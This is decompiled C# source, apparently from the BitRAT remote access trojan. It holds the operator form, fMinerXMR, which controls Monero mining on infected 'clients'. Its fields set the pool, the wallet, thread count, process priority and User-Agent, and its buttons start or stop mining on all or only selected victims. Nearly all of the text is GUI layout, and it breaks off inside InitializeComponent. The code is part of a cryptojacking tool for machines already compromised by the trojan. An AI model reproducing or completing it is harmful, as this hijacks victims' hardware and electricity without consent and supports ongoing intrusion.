﻿using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fMinerXMR : Form
{
    private IContainer icontainer_0;
    private StatusStrip statusStrip_0;
    private ToolStripStatusLabel toolStripStatusLabel_0;
    private ToolStripStatusLabel toolStripStatusLabel_1;
    private OLVColumn olvcolumn_0;
    private OLVColumn olvcolumn_1;
    private OLVColumn olvcolumn_2;
    private OLVColumn olvcolumn_3;
    private OLVColumn olvcolumn_4;
    private OLVColumn olvcolumn_5;
    private OLVColumn olvcolumn_6;
    private OLVColumn olvcolumn_7;
    private FastObjectListView fastObjectListView_0;
    private ToolStripStatusLabel toolStripStatusLabel_2;
    private Timer timer_0;
    private RadioButton radioButton_0;
    private RadioButton radioButton_1;
    private Label label_0;
    private TextBox textBox_0;
    private TextBox textBox_1;
    private Label label_1;
    private Label label_2;
    private ComboBox comboBox_0;
    private ComboBox comboBox_1;
    private Label label_3;
    private OLVColumn olvcolumn_8;
    private CheckBox checkBox_0;
    private TextBox textBox_2;
    private Label label_4;
    private ComboBox comboBox_2;
    private Label label_5;
    private CheckBox checkBox_1;
    private ComboBox comboBox_3;
    private Label label_6;
    private TextBox textBox_3;
    private Label label_7;
    private CheckBox checkBox_2;
    private TextBox textBox_4;
    private Label label_8;
    private OLVColumn olvcolumn_9;
    private ContextMenuStrip contextMenuStrip_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private ToolStripMenuItem toolStripMenuItem_1;
    private ToolStripSeparator toolStripSeparator_0;
    private ToolStripMenuItem toolStripMenuItem_2;
    private ToolStripSeparator toolStripSeparator_1;
    private ToolStripMenuItem toolStripMenuItem_3;
    private ToolStripMenuItem toolStripMenuItem_4;
    private ToolStripSeparator toolStripSeparator_2;
    private ToolStripMenuItem toolStripMenuItem_5;
    private ToolStripMenuItem toolStripMenuItem_6;
    private ToolStripSeparator toolStripSeparator_3;
    private ToolStripMenuItem toolStripMenuItem_7;
    private CheckBox checkBox_3;
    private PictureBox pictureBox_0;
    private BackgroundWorker backgroundWorker_0;
    private VisualButton visualButton_0;
    private VisualButton visualButton_1;
    private PictureBox pictureBox_1;
    public ConcurrentStack<cMinerXMRcli> concurrentStack_0;
    public ConcurrentStack<cMinerXMRcli> concurrentStack_1;
    public ConcurrentStack<cMinerXMRcli> concurrentStack_2;

    public fMinerXMR()
    {
        base.Load += new EventHandler(this.fMinerXMR_Load);
        base.Closing += new CancelEventHandler(this.fMinerXMR_Closing);
        this.concurrentStack_0 = new ConcurrentStack<cMinerXMRcli>();
        this.concurrentStack_1 = new ConcurrentStack<cMinerXMRcli>();
        this.concurrentStack_2 = new ConcurrentStack<cMinerXMRcli>();
        this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fMinerXMR_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    private void fMinerXMR_Load(object sender, EventArgs e)
    {
        this.method_4();
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_1(new StatusStrip());
        this.vmethod_3(new ToolStripStatusLabel());
        this.vmethod_5(new ToolStripStatusLabel());
        this.vmethod_25(new ToolStripStatusLabel());
        this.vmethod_7(new OLVColumn());
        this.vmethod_9(new OLVColumn());
        this.vmethod_11(new OLVColumn());
        this.vmethod_13(new OLVColumn());
        this.vmethod_15(new OLVColumn());
        this.vmethod_17(new OLVColumn());
        this.vmethod_19(new OLVColumn());
        this.vmethod_21(new OLVColumn());
        this.vmethod_23(new FastObjectListView());
        this.vmethod_49(new OLVColumn());
        this.vmethod_77(new OLVColumn());
        this.vmethod_79(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_81(new ToolStripMenuItem());
        this.vmethod_83(new ToolStripMenuItem());
        this.vmethod_85(new ToolStripSeparator());
        this.vmethod_87(new ToolStripMenuItem());
        this.vmethod_89(new ToolStripSeparator());
        this.vmethod_91(new ToolStripMenuItem());
        this.vmethod_93(new ToolStripMenuItem());
        this.vmethod_95(new ToolStripSeparator());
        this.vmethod_97(new ToolStripMenuItem());
        this.vmethod_99(new ToolStripMenuItem());
        this.vmethod_101(new ToolStripSeparator());
        this.vmethod_103(new ToolStripMenuItem());
        this.vmethod_27(new Timer(this.icontainer_0));
        this.vmethod_29(new RadioButton());
        this.vmethod_31(new RadioButton());
        this.vmethod_33(new Label());
        this.vmethod_35(new TextBox());
        this.vmethod_37(new TextBox());
        this.vmethod_39(new Label());
        this.vmethod_41(new Label());
        this.vmethod_43(new ComboBox());
        this.vmethod_45(new ComboBox());
        this.vmethod_47(new Label());
        this.vmethod_51(new CheckBox());
        this.vmethod_53(new TextBox());
        this.vmethod_55(new Label());
        this.vmethod_57(new ComboBox());
        this.vmethod_59(new Label());
        this.vmethod_61(new CheckBox());
        this.vmethod_63(new ComboBox());
        this.vmethod_65(new Label());
        this.vmethod_67(new TextBox());
        this.vmethod_69(new Label());
        this.vmethod_71(new CheckBox());
        this.vmethod_73(new TextBox());
        this.vmethod_75(new Label());
        this.vmethod_105(new CheckBox());
        this.vmethod_107(new PictureBox());
        this.vmethod_109(new BackgroundWorker());
        this.vmethod_111(new VisualButton());
        this.vmethod_113(new VisualButton());
        this.vmethod_115(new PictureBox());
        this.vmethod_0().SuspendLayout();
        this.vmethod_22().BeginInit();
        this.vmethod_78().SuspendLayout();
        ((ISupportInitialize) this.vmethod_106()).BeginInit();
        ((ISupportInitialize) this.vmethod_114()).BeginInit();
        base.SuspendLayout();
        this.vmethod_0().AutoSize = false;
        this.vmethod_0().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_0().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] toolStripItems = new ToolStripItem[] { this.vmethod_2(), this.vmethod_4(), this.vmethod_24() };
        this.vmethod_0().Items.AddRange(toolStripItems);
        this.vmethod_0().Location = new Point(0, 0x1e8);
        this.vmethod_0().Name = "ssTransferStatus";
        this.vmethod_0().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_0().Size = new Size(0x42e, 0x13);
        this.vmethod_0().SizingGrip = false;
        this.vmethod_0().Stretch = false;
        this.vmethod_0().TabIndex = 0x20;
        this.vmethod_0().Text = "stStatus";
        this.vmethod_2().AutoSize = false;
        this.vmethod_2().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_2().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_2().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_2().Name = "tsMinersCount";
        this.vmethod_2().Size = new Size(140, 0x10);
        this.vmethod_2().Text = "Miners: 0";
        this.vmethod_2().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_4().AutoSize = false;
        this.vmethod_4().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_4().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_4().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_4().Name = "tsMinersSpeed";
        this.vmethod_4().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_4().Size = new Size(180, 0x10);
        this.vmethod_4().Text = "Speed: N/A";
        this.vmethod_4().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_24().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_24().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_24().Margin = new Padding(0, 3, -4, 0);
        this.vmethod_24().Name = "tsMinersSelected";
        this.vmethod_24().Size = new Size(0x2ea, 0x10);
        this.vmethod_24().Spring = true;
        this.vmethod_24().Text = "Selected clients: 0";
        this.vmethod_24().TextAlign = ContentAlignment.MiddleRight;
        this.vmethod_6().set_AspectName("SPEED");
        this.vmethod_6().set_Hideable(false);
        this.vmethod_6().Text = "Speed";
        this.vmethod_8().set_AspectName("SHARES");
        this.vmethod_8().set_Hideable(false);
        this.vmethod_8().Text = "Shares";
        this.vmethod_10().set_AspectName("CPU");
        this.vmethod_10().set_Hideable(false);
        this.vmethod_10().Text = "CPU";
        this.vmethod_12().set_AspectName("OPENCL");
        this.vmethod_12().set_Hideable(false);
        this.vmethod_12().Text = "OpenCL";
        this.vmethod_14().set_AspectName("DONATE");
        this.vmethod_14().set_Hideable(false);
        this.vmethod_14().Text = "Donate";
        this.vmethod_16().set_AspectName("POOL");
        this.vmethod_16().set_Hideable(false);
        this.vmethod_16().Text = "Pool";
        this.vmethod_18().set_AspectName("THREADS");
        this.vmethod_18().set_Hideable(false);
        this.vmethod_18().Text = "Threads";
        this.vmethod_20().set_AspectName("USER");
        this.vmethod_20().set_Hideable(false);
        this.vmethod_20().Text = "User";
        this.vmethod_22().Alignment = ListViewAlignment.Left;
        this.vmethod_22().get_AllColumns().Add(this.vmethod_20());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_18());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_16());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_48());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_12());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_10());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_8());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_14());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_6());
        this.vmethod_22().get_AllColumns().Add(this.vmethod_76());
        this.vmethod_22().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_22().AutoArrange = false;
        this.vmethod_22().BorderStyle = BorderStyle.None;
        this.vmethod_22().set_CellEditUseWholeCell(false);
        ColumnHeader[] values = new ColumnHeader[10];
        values[0] = this.vmethod_20();
        values[1] = this.vmethod_18();
        values[2] = this.vmethod_16();
        values[3] = this.vmethod_48();
        values[4] = this.vmethod_12();
        values[5] = this.vmethod_10();
        values[6] = this.vmethod_8();
        values[7] = this.vmethod_14();
        values[8] = this.vmethod_6();
        values[9] = this.vmethod_76();
        this.vmethod_22().get_Columns().AddRange(values);
        this.vmethod_22().ContextMenuStrip = this.vmethod_78();
        this.vmethod_22().Cursor = Cursors.Default;
        this.vmethod_22().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_22().FullRowSelect = true;
        this.vmethod_22().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_22().HideSelection = false;
        this.vmethod_22().Location = new Point(0, 1);
        this.vmethod_22().Margin = new Padding(1);
        this.vmethod_22().Name = "lvMiners";
        this.vmethod_22().set_ShowGroups(false);
        this.vmethod_22().Size = new Size(0x42e, 0x19f);
        this.vmethod_22().TabIndex = 0x1f;
        this.vmethod_22().set_UseCellFormatEvents(true);
        this.vmethod_22().UseCompatibleStateImageBehavior = false;
        this.vmethod_22().set_UseHotControls(false);
        this.vmethod_22().set_UseOverlays(false);
        this.vmethod_22().set_View(View.Details);
        this.vmethod_22().VirtualMode = true;
        this.vmethod_48().set_AspectName("ALGO");
        this.vmethod_48().set_Hideable(false);
        this.vmethod_48().Text = "Algorithm";
        this.vmethod_76().set_AspectName("DURATION");
        this.vmethod_76().set_Hideable(false);
        this.vmethod_76().Text = "Duration";
        this.vmethod_78().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray2 = new ToolStripItem[] { this.vmethod_80(), this.vmethod_88(), this.vmethod_90(), this.vmethod_94(), this.vmethod_96() };
        this.vmethod_78().Items.AddRange(itemArray2);
        this.vmethod_78().Name = "ContextMenuStrip1";
        this.vmethod_78().Size = new Size(170, 0x52);
        ToolStripItem[] itemArray3 = new ToolStripItem[] { this.vmethod_82(), this.vmethod_84(), this.vmethod_86() };
        this.vmethod_80().DropDownItems.AddRange(itemArray3);
        this.vmethod_80().Name = "LogsToolStripMenuItem";
        this.vmethod_80().Size = new Size(0xa9, 0x16);
        this.vmethod_80().Text = "Logs";
        this.vmethod_82().Name = "DownloadToolStripMenuItem";
        this.vmethod_82().Size = new Size(0xb0, 0x16);
        this.vmethod_82().Text = "Download";
        this.vmethod_84().Name = "ToolStripMenuItem1";
        this.vmethod_84().Size = new Size(0xad, 6);
        this.vmethod_86().Name = "OpenLogManagerToolStripMenuItem";
        this.vmethod_86().Size = new Size(0xb0, 0x16);
        this.vmethod_86().Text = "Open Log manager";
        this.vmethod_88().Name = "ToolStripMenuItem3";
        this.vmethod_88().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray4 = new ToolStripItem[] { this.vmethod_92() };
        this.vmethod_90().DropDownItems.AddRange(itemArray4);
        this.vmethod_90().Name = "OperationsToolStripMenuItem";
        this.vmethod_90().Size = new Size(0xa9, 0x16);
        this.vmethod_90().Text = "Operations";
        this.vmethod_92().Name = "StopToolStripMenuItem";
        this.vmethod_92().Size = new Size(0x62, 0x16);
        this.vmethod_92().Text = "Stop";
        this.vmethod_94().Name = "ToolStripMenuItem2";
        this.vmethod_94().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray5 = new ToolStripItem[] { this.vmethod_98(), this.vmethod_100(), this.vmethod_102() };
        this.vmethod_96().DropDownItems.AddRange(itemArray5);
        this.vmethod_96().Name = "CopyToClipboardToolStripMenuItem";
        this.vmethod_96().Size = new Size(0xa9, 0x16);
        this.vmethod_96().Text = "Copy to clipboard";
        this.vmethod_98().Name = "SelectedToolStripMenuItem";
        this.vmethod_98().Size = new Size(0x76, 0x16);
        this.vmethod_98().Text = "Selected";
        this.vmethod_100().Name = "ToolStripMenuItem4";
        this.vmethod_100().Size = new Size(0x73, 6);
        this.vmethod_102().Name = "AllToolStripMenuItem";
        this.vmethod_102().Size = new Size(0x76, 0x16);
        this.vmethod_102().Text = "All";
        this.vmethod_26().Enabled = true;
        this.vmethod_26().Interval = 0x3e8;
        this.vmethod_28().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_28().AutoSize = true;
        this.vmethod_28().BackColor = Color.Transparent;
        this.vmethod_28().Checked = true;
        this.vmethod_28().Location = new Point(8, 0x1cd);
        this.vmethod_28().Margin = new Padding(2);
        this.vmethod_28().Name = "rbAll";
        this.vmethod_28().Size = new Size(0x24, 0x11);
        this.vmethod_28().TabIndex = 0x23;
        this.vmethod_28().TabStop = true;
        this.vmethod_28().Text = "All";
        this.vmethod_28().UseVisualStyleBackColor = false;
        this.vmethod_30().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_30().AutoSize = true;
        this.vmethod_30().BackColor = Color.Transparent;
        this.vmethod_30().Location = new Point(0x2e, 0x1cd);
        this.vmethod_30().Margin = new Padding(2);
        this.vmethod_30().Name = "rbSelected";
        this.vmethod_30().Size = new Size(0x7a, 0x11);
        this.vmethod_30().TabIndex = 0x24;
        this.vmethod_30().Text = "Only selected clients";
        this.vmethod_30().UseVisualStyleBackColor = false;
        this.vmethod_32().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_32().BackColor = Color.Transparent;
        this.vmethod_32().Location = new Point(0xb6, 430);
        this.vmethod_32().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_32().Name = "lblPool";
        this.vmethod_32().Size = new Size(0x39, 13);
        this.vmethod_32().TabIndex = 0x25;
        this.vmethod_32().Text = "Pool:";
        this.vmethod_32().TextAlign = ContentAlignment.TopRight;
        this.vmethod_34().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_34().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_34().ForeColor = Color.Gray;
        this.vmethod_34().Location = new Point(0xf3, 0x1ac);
        this.vmethod_34().Margin = new Padding(2);
        this.vmethod_34().Name = "txtPool";
        this.vmethod_34().Size = new Size(0xbf, 20);
        this.vmethod_34().TabIndex = 0x26;
        this.vmethod_34().Text = "example-pool.com:5555";
        this.vmethod_36().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_36().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_36().ForeColor = Color.Gray;
        this.vmethod_36().Location = new Point(0xf3, 0x1c0);
        this.vmethod_36().Margin = new Padding(2);
        this.vmethod_36().Name = "txtUsername";
        this.vmethod_36().Size = new Size(0xbf, 20);
        this.vmethod_36().TabIndex = 40;
        this.vmethod_36().Text = "Username/wallet address";
        this.vmethod_38().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_38().BackColor = Color.Transparent;
        this.vmethod_38().Location = new Point(0xb3, 450);
        this.vmethod_38().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_38().Name = "lblUsername";
        this.vmethod_38().Size = new Size(60, 13);
        this.vmethod_38().TabIndex = 0x27;
        this.vmethod_38().Text = "Username:";
        this.vmethod_38().TextAlign = ContentAlignment.TopRight;
        this.vmethod_40().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_40().BackColor = Color.Transparent;
        this.vmethod_40().Location = new Point(0x1b3, 0x1ab);
        this.vmethod_40().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_40().Name = "lblAlgo";
        this.vmethod_40().Size = new Size(60, 13);
        this.vmethod_40().TabIndex = 0x29;
        this.vmethod_40().Text = "Algorithm:";
        this.vmethod_40().TextAlign = ContentAlignment.TopRight;
        this.vmethod_42().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_42().BackColor = Color.White;
        this.vmethod_42().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_42().ForeColor = Color.Black;
        this.vmethod_42().FormattingEnabled = true;
        this.vmethod_42().ImeMode = ImeMode.NoControl;
        this.vmethod_42().Location = new Point(0x1f3, 0x1a9);
        this.vmethod_42().Margin = new Padding(2);
        this.vmethod_42().Name = "cbAlgo";
        this.vmethod_42().Size = new Size(0x4d, 0x15);
        this.vmethod_42().TabIndex = 0x2b;
        this.vmethod_42().TabStop = false;
        this.vmethod_44().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_44().BackColor = Color.White;
        this.vmethod_44().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_44().ForeColor = Color.Black;
        this.vmethod_44().FormattingEnabled = true;
        this.vmethod_44().ImeMode = ImeMode.NoControl;
        this.vmethod_44().Location = new Point(0x1f3, 0x1bf);
        this.vmethod_44().Margin = new Padding(2);
        this.vmethod_44().Name = "cbThreads";
        this.vmethod_44().Size = new Size(0x4d, 0x15);
        this.vmethod_44().TabIndex = 0x2d;
        this.vmethod_44().TabStop = false;
        this.vmethod_46().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_46().BackColor = Color.Transparent;
        this.vmethod_46().Location = new Point(0x1be, 0x1c1);
        this.vmethod_46().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_46().Name = "lblThreads";
        this.vmethod_46().Size = new Size(0x31, 13);
        this.vmethod_46().TabIndex = 0x2c;
        this.vmethod_46().Text = "Threads:";
        this.vmethod_46().TextAlign = ContentAlignment.TopRight;
        this.vmethod_50().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_50().AutoSize = true;
        this.vmethod_50().BackColor = Color.Transparent;
        this.vmethod_50().Location = new Point(0x34f, 470);
        this.vmethod_50().Margin = new Padding(2);
        this.vmethod_50().Name = "chkNicehash";
        this.vmethod_50().Size = new Size(0x47, 0x11);
        this.vmethod_50().TabIndex = 0x2e;
        this.vmethod_50().TabStop = false;
        this.vmethod_50().Text = "Nicehash";
        this.vmethod_50().UseVisualStyleBackColor = false;
        this.vmethod_52().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_52().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_52().ForeColor = Color.Gray;
        this.vmethod_52().Location = new Point(0xf3, 0x1d5);
        this.vmethod_52().Margin = new Padding(2);
        this.vmethod_52().Name = "txtPassword";
        this.vmethod_52().Size = new Size(0xbf, 20);
        this.vmethod_52().TabIndex = 0x30;
        this.vmethod_52().Text = "(Optional)";
        this.vmethod_54().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_54().BackColor = Color.Transparent;
        this.vmethod_54().Location = new Point(0xb6, 0x1d7);
        this.vmethod_54().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_54().Name = "lblPassword";
        this.vmethod_54().Size = new Size(0x39, 13);
        this.vmethod_54().TabIndex = 0x2f;
        this.vmethod_54().Text = "Password:";
        this.vmethod_54().TextAlign = ContentAlignment.TopRight;
        this.vmethod_56().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_56().BackColor = Color.White;
        this.vmethod_56().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_56().ForeColor = Color.Black;
        this.vmethod_56().FormattingEnabled = true;
        this.vmethod_56().ImeMode = ImeMode.NoControl;
        this.vmethod_56().Location = new Point(0x1f3, 0x1d5);
        this.vmethod_56().Margin = new Padding(2);
        this.vmethod_56().Name = "cbDonate";
        this.vmethod_56().Size = new Size(0x4d, 0x15);
        this.vmethod_56().TabIndex = 0x34;
        this.vmethod_56().TabStop = false;
        this.vmethod_58().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_58().BackColor = Color.Transparent;
        this.vmethod_58().Location = new Point(0x1be, 0x1d7);
        this.vmethod_58().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_58().Name = "lblDonate";
        this.vmethod_58().Size = new Size(0x31, 13);
        this.vmethod_58().TabIndex = 0x33;
        this.vmethod_58().Text = "Donate:";
        this.vmethod_58().TextAlign = ContentAlignment.TopRight;
        this.vmethod_60().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_60().AutoSize = true;
        this.vmethod_60().BackColor = Color.Transparent;
        this.vmethod_60().Checked = true;
        this.vmethod_60().CheckState = CheckState.Checked;
        this.vmethod_60().Location = new Point(0x2a3, 470);
        this.vmethod_60().Margin = new Padding(2);
        this.vmethod_60().Name = "chkKeepalive";
        this.vmethod_60().Size = new Size(0x49, 0x11);
        this.vmethod_60().TabIndex = 0x35;
        this.vmethod_60().TabStop = false;
        this.vmethod_60().Text = "Keepalive";
        this.vmethod_60().UseVisualStyleBackColor = false;
        this.vmethod_62().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_62().BackColor = Color.White;
        this.vmethod_62().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_62().ForeColor = Color.Black;
        this.vmethod_62().FormattingEnabled = true;
        this.vmethod_62().ImeMode = ImeMode.NoControl;
        this.vmethod_62().Location = new Point(0x2a3, 0x1a9);
        this.vmethod_62().Margin = new Padding(2);
        this.vmethod_62().Name = "cbProcessPriority";
        this.vmethod_62().Size = new Size(0x5d, 0x15);
        this.vmethod_62().TabIndex = 0x37;
        this.vmethod_62().TabStop = false;
        this.vmethod_64().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_64().BackColor = Color.Transparent;
        this.vmethod_64().Location = new Point(0x243, 0x1ab);
        this.vmethod_64().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_64().Name = "lblProcessPriority";
        this.vmethod_64().Size = new Size(0x5d, 13);
        this.vmethod_64().TabIndex = 0x36;
        this.vmethod_64().Text = "Process priority:";
        this.vmethod_64().TextAlign = ContentAlignment.TopRight;
        this.vmethod_66().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_66().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_66().ForeColor = Color.Gray;
        this.vmethod_66().Location = new Point(0x2a3, 0x1c0);
        this.vmethod_66().Margin = new Padding(2);
        this.vmethod_66().Name = "txtUserAgent";
        this.vmethod_66().Size = new Size(0x15c, 20);
        this.vmethod_66().TabIndex = 0x39;
        this.vmethod_66().Text = "(Optional)";
        this.vmethod_68().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_68().BackColor = Color.Transparent;
        this.vmethod_68().Location = new Point(0x25d, 0x1c3);
        this.vmethod_68().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_68().Name = "lblUserAgent";
        this.vmethod_68().Size = new Size(0x43, 13);
        this.vmethod_68().TabIndex = 0x38;
        this.vmethod_68().Text = "User-Agent:";
        this.vmethod_68().TextAlign = ContentAlignment.TopRight;
        this.vmethod_70().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_70().AutoSize = true;
        this.vmethod_70().BackColor = Color.Transparent;
        this.vmethod_70().Location = new Point(0x2ec, 470);
        this.vmethod_70().Margin = new Padding(2);
        this.vmethod_70().Name = "chkHugePages";
        this.vmethod_70().Size = new Size(0x63, 0x11);
        this.vmethod_70().TabIndex = 0x3a;
        this.vmethod_70().TabStop = false;
        this.vmethod_70().Text = "No huge pages";
        this.vmethod_70().UseVisualStyleBackColor = false;
        this.vmethod_72().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_72().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_72().ForeColor = Color.Gray;
        this.vmethod_72().Location = new Point(0x33a, 0x1ac);
        this.vmethod_72().Margin = new Padding(2);
        this.vmethod_72().Name = "txtRigID";
        this.vmethod_72().Size = new Size(0xc5, 20);
        this.vmethod_72().TabIndex = 60;
        this.vmethod_72().Text = "(Optional)";
        this.vmethod_74().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_74().BackColor = Color.Transparent;
        this.vmethod_74().Location = new Point(0x30f, 430);
        this.vmethod_74().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_74().Name = "lblRigID";
        this.vmethod_74().Size = new Size(0x27, 13);
        this.vmethod_74().TabIndex = 0x3b;
        this.vmethod_74().Text = "Rig ID:";
        this.vmethod_74().TextAlign = ContentAlignment.TopRight;
        this.vmethod_104().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_104().AutoSize = true;
        this.vmethod_104().BackColor = Color.Transparent;
        this.vmethod_104().Location = new Point(0x39a, 470);
        this.vmethod_104().Margin = new Padding(2);
        this.vmethod_104().Name = "chk64bit";
        this.vmethod_104().Size = new Size(0x34, 0x11);
        this.vmethod_104().TabIndex = 0x3d;
        this.vmethod_104().TabStop = false;
        this.vmethod_104().Text = "64-bit";
        this.vmethod_104().UseVisualStyleBackColor = false;
        this.vmethod_106().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_106().Image = Class131.smethod_24();
        this.vmethod_106().Location = new Point(0x3d2, 0x1d5);
        this.vmethod_106().Margin = new Padding(2);
        this.vmethod_106().Name = "chkMiner64";
        this.vmethod_106().Size = new Size(15, 15);
        this.vmethod_106().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_106().TabIndex = 80;
        this.vmethod_106().TabStop = false;
        this.vmethod_110().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_110().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_110().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_110().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_110().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_110().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_110().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_110().Border.HoverVisible = true;
        this.vmethod_110().Border.Rounding = 6;
        this.vmethod_110().Border.Thickness = 1;
        this.vmethod_110().Border.Type = ShapeTypes.Rounded;
        this.vmethod_110().Border.Visible = true;
        this.vmethod_110().DialogResult = DialogResult.None;
        this.vmethod_110().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_110().Image = null;
        this.vmethod_110().Location = new Point(0x4b, 0x1ad);
        this.vmethod_110().MouseState = MouseStates.Normal;
        this.vmethod_110().Name = "btnStop";
        this.vmethod_110().Size = new Size(0x3d, 30);
        this.vmethod_110().TabIndex = 0x5f;
        this.vmethod_110().Text = "Stop";
        this.vmethod_110().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_110().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_110().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_110().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_110().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_110().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_110().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_110().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_112().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_112().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_112().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_112().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_112().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
